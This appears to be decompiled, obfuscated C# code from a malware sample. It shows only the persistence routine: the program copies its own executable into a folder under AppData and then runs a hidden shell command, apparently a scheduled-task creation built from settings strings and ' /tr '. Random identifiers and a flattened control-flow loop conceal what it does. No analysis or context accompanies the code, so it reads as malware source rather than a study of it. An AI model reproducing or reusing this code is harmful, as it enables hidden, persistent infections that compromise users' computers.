using System;
using System.IO;
using System.Threading;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.VisualBasic.MyServices;
using QWDFVB.My;
using Ulq71qYO9Oc25W2GE3;
using YntkCmRvu3wTEtF9OJ;

namespace pS4cdoCa0GadJsZXuU;

[StandardModule]
internal sealed class bPfUFDAx48csqtOx2w
{
	public static void cOYZBDYWPE()
	{
		jndLVGagejJsDWshNC3();
		if (!TjmZnSa9TUIvI6cFJjQ())
		{
			int try0010_dispatch = -1;
			int num = default(int);
			bool fIK5AS0FBC = default(bool);
			int num2 = default(int);
			int num3 = default(int);
			string text = default(string);
			string object_ = default(string);
			string object_2 = default(string);
			string text2 = default(string);
			string text3 = default(string);
			while (true)
			{
				try
				{
					/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
					int num4;
					int num5;
					switch (try0010_dispatch)
					{
					default:
						num = 1;
						fIK5AS0FBC = EkWM3SuPulRFvZGJal.FIK5AS0FBC;
						goto IL_00f6;
					case 435:
						{
							num2 = num;
							goto IL_001f;
						}
						IL_00f6:
						if (fIK5AS0FBC)
						{
							goto IL_00ef;
						}
						goto end_IL_0010;
						IL_00ef:
						ProjectData.ClearProjectError();
						goto IL_00e9;
						IL_00e9:
						num3 = -2;
						goto IL_00d5;
						IL_00d5:
						num = 3;
						num4 = 0;
						if (!TjmZnSa9TUIvI6cFJjQ())
						{
							goto IL_0034;
						}
						goto IL_0100;
						IL_0034:
						switch (num4)
						{
						case 2:
							break;
						case 16:
							goto IL_0093;
						case 1:
							goto IL_00d5;
						case 13:
							goto IL_00e9;
						case 4:
							goto IL_00ef;
						case 9:
							goto IL_00f6;
						case 0:
							goto IL_0100;
						case 15:
							goto IL_011f;
						case 6:
							goto IL_013a;
						default:
							goto IL_013d;
						case 14:
							goto IL_015d;
						case 11:
							goto IL_0163;
						case 7:
						case 10:
							goto IL_0173;
						case 5:
							goto IL_01a3;
						case 8:
						case 12:
							goto end_IL_0010_2;
						}
						goto IL_001f;
						IL_0100:
						text = (string)i4uoERaDIqqUcwMiNUL(y8BNdkaOHvlqgfbWHiN());
						goto IL_011a;
						IL_001f:
						if (num3 <= -2)
						{
							num4 = 16;
							if (!TjmZnSa9TUIvI6cFJjQ())
							{
								goto IL_0034;
							}
							goto IL_015d;
						}
						switch (num3)
						{
						default:
							goto end_IL_0010_3;
						case 1:
							break;
						case 0:
							goto end_IL_0010_3;
						}
						goto IL_0093;
						IL_018f:
						num = 9;
						Interaction.Shell((string)lJkABvabWd4fJINfBu5(object_, object_2), (AppWinStyle)0, false, -1);
						goto IL_01a3;
						IL_01a3:
						num = 10;
						break;
						IL_0093:
						num5 = num2 + 1;
						num2 = 0;
						switch (num5)
						{
						case 1:
							break;
						default:
							goto end_IL_0010_3;
						case 3:
							goto IL_00d5;
						case 2:
							goto IL_00ef;
						case 0:
							goto end_IL_0010_3;
						case 4:
							goto IL_011a;
						case 5:
							goto IL_011f;
						case 6:
							goto IL_013a;
						case 7:
							goto IL_015d;
						case 8:
							goto IL_0163;
						case 9:
							goto IL_018f;
						case 10:
							goto IL_01a3;
						case 11:
						case 12:
							goto end_IL_0010;
						}
						goto default;
						IL_011a:
						num = 4;
						text2 = text;
						goto IL_011f;
						IL_011f:
						num = 5;
						object_2 = (string?)Hb3gBVah5hWg6dZEf9D(Environment.SpecialFolder.ApplicationData) + EkWM3SuPulRFvZGJal.eSkZTvvyby + "\\" + text2;
						goto IL_013a;
						IL_013a:
						num = 6;
						goto IL_013d;
						IL_013d:
						FOgOxZarHPWh4YaEAqr(SJ9NNIa2TtfgGeAFvoi(W9LK2NaSt0xyvXgXO2n()), object_2, File.ReadAllBytes((string)aY2TFSauasPytZWNq8f(EkWM3SuPulRFvZGJal.PUyZPYcOhR)), bool_0: true);
						goto IL_015d;
						IL_015d:
						num = 7;
						text3 = text;
						goto IL_0163;
						IL_0163:
						num = 8;
						TjmZnSa9TUIvI6cFJjQ();
						if (!jndLVGagejJsDWshNC3())
						{
							break;
						}
						goto IL_0173;
						IL_0173:
						object_ = MySettingsProperty.Settings.Setting789 + text3 + " /tr ";
						goto IL_018f;
						end_IL_0010_2:
						break;
					}
					FTfQnaaH7GqUPPrOu02(10000);
					break;
					end_IL_0010_3:;
				}
				catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
				{
					gv9Vrea5Epf41hXiMkp((Exception)obj);
					try0010_dispatch = 435;
					continue;
				}
				throw E3dyx8aQCYJMtkSiYt2(-2146828237);
				continue;
				end_IL_0010:
				break;
			}
			if (num2 == 0)
			{
				return;
			}
		}
		Q9VbpxaT1UfDpNU8E9S();
	}

	internal static object y8BNdkaOHvlqgfbWHiN()
	{
		return MySettingsProperty.Settings;
	}

	internal static object i4uoERaDIqqUcwMiNUL(object object_0)
	{
		return ((MySettings)object_0).Setting0202;
	}

	internal static object Hb3gBVah5hWg6dZEf9D(Environment.SpecialFolder specialFolder_0)
	{
		return Environment.GetFolderPath(specialFolder_0);
	}

	internal static object W9LK2NaSt0xyvXgXO2n()
	{
		return uj5IdEKfuKbugcX2aA.wj7Lk4lVY;
	}

	internal static object SJ9NNIa2TtfgGeAFvoi(object object_0)
	{
		return ((ServerComputer)object_0).get_FileSystem();
	}

	internal static object aY2TFSauasPytZWNq8f(object object_0)
	{
		return Conversions.ToString(object_0);
	}

	internal static void FOgOxZarHPWh4YaEAqr(object object_0, object object_1, object object_2, bool bool_0)
	{
		((FileSystemProxy)object_0).WriteAllBytes((string)object_1, (byte[])object_2, bool_0);
	}

	internal static object lJkABvabWd4fJINfBu5(object object_0, object object_1)
	{
		return (string?)object_0 + (string?)object_1;
	}

	internal static void FTfQnaaH7GqUPPrOu02(int int_0)
	{
		Thread.Sleep(int_0);
	}

	internal static void gv9Vrea5Epf41hXiMkp(object object_0)
	{
		ProjectData.SetProjectError((Exception)object_0);
	}

	internal static object E3dyx8aQCYJMtkSiYt2(int int_0)
	{
		return ProjectData.CreateProjectError(int_0);
	}

	internal static void Q9VbpxaT1UfDpNU8E9S()
	{
		ProjectData.ClearProjectError();
	}

	internal static bool jndLVGagejJsDWshNC3()
	{
		return true;
	}

	internal static bool TjmZnSa9TUIvI6cFJjQ()
	{
		return false;
	}
}
